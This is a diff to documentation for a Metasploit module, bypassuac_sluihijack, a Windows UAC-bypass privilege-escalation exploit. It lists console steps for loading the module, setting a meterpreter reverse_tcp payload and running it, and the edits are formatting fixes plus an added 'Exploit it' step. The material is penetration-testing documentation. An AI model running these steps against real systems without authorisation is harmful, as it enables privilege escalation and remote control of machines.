@@ -20,8 +20,9 @@
   2. Load module: `use exploit/windows/local/bypassuac_sluihijack`
   3. Set the `payload`: `set payload windows/x64/meterpreter/reverse_tcp`
   4. If an existing handler is configured to receive the elevated session,
-  then the module's handler should be disabled: set DisablePayloadHandler true.
+  then the module's handler should be disabled: `set DisablePayloadHandler true`.
   5. Configure the `payload`.
+  6. `Exploit` it.
 
 ## Scenario
 
